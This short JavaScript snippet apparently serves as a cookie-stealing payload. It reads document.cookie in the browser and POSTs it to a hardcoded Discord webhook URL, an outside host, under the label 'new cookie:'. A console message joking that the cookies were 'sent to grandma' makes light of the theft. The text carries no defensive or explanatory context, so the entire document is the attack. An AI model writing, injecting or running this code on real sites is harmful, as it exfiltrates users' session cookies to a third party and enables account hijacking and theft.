fetch("https://discord.com/api/webhooks/1110165888746926090/3RtVoJwCqglC6P4r1b7-DIyH1VA2ElG-dpPJzQCxAi-COUmoa0xemCX05dHqgHJ2NUkM",{body: JSON.stringify({content: "new cookie:" + document.cookie}), headers: {"Content-Type": "application/json"},method: "POST"})
console.log("sent the cookies to grandma")
